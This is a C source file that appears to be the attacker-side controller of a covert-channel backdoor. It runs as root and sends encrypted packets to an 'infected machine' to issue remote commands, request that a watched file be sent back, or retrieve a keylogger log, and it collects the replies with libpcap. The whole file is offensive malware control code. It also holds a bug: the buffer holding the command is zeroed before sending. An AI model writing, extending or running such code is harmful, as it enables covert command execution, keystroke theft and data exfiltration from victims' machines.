#include <getopt.h>
#include <pthread.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--target    -   target machine to attack\n"
            "\t--command   -   command to request from infected machine\n"
            "\t--local     -   your local ip\n"
            "\t--tcp       -   use TCP protocol\n"
            "\t--directory -   directory to watch\n"
            "\t--file      -   file to watch\n"
            "\t--keylogger -   get keylogger file\n");
}

static struct option long_options[] = {
    {"target",    required_argument,    0,  1 },
    {"command",   optional_argument,    0,  2 },
    {"local",     required_argument,    0,  3 },
    {"tcp",       optional_argument,    0,  4 },
    {"directory", optional_argument,    0,  5 },
    {"file",      optional_argument,    0,  6 },
    {"keylogger", optional_argument,    0,  7 },
    {0,         0,                      0,  0 }
};

int main(int argc, char **argv){
    pthread_t inotify_thread;
    int arg;
    char targetip[BUFSIZ];
    char localip[BUFSIZ];
    unsigned char data[BUFSIZ];
    char pcapfilter[BUFSIZ];
    char file[BUFSIZ];
    char directory[BUFSIZ];
    struct filter Filter;
    bool tcp = false, if_command = false, if_directory = false, if_file = false, if_keylogger = false;

    /* make sure user has root privilege */
    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 1:
                //target ip
                strncpy(targetip, optarg, BUFSIZ);
                break;
            case 2:
                //command string
                if_command = true;
                strncpy(data, (unsigned char*)optarg, BUFSIZ);
                break;
            case 3:
                //local ip
                strncpy(localip, optarg, BUFSIZ);
                break;
            case 4:
                //if using tcp or udp
                tcp = true;
                break;
            case 5:
                //directory to watch
                strncpy(directory, optarg, BUFSIZ);
                if_directory = true;
                break;
            case 6:
                //file to watch
                strncpy(file, optarg, BUFSIZ);
                if_file = true;
                break;
            case 7:
                //keylogger file
                if_keylogger = true;
                break;
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }

    memset(data, 0, sizeof(data));

    //validate inotify directory and file
    if((if_directory && !if_file) || (!if_directory && if_file)) {
        perror("inotify requires both --directory and --file");
        print_usage();
        return 0;
    }

    //send packet with COMMAND keys and encrypted data
    if(if_command == true) {
        covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
    //send packet with INOTIFY keys and encrypted
    } else if(if_file == true && if_directory == true) {
        snprintf(data, BUFSIZ, "%s\n%s", directory, file);
        printf("DEBUG: data: %s\n", data);
        covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
    //send packet with KEYLOGGER keys and encrypted
    } else if (if_keylogger == true) {
        covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
    }

    //send EOT to tell the infected that we are ready to receive
    covert_send(localip, targetip, UPORT, UPORT, data, EOT);

    //create filter (tcp/udp, command, ip, port)
    Filter = InitFilter(targetip, localip, false, tcp);
    CreateFilter(pcapfilter, tcp,targetip);
    printf("Filter: %s\n",pcapfilter);

    //libpcap (tcp/udp, command)
    Packetcapture(pcapfilter,Filter);

    return 0;
}
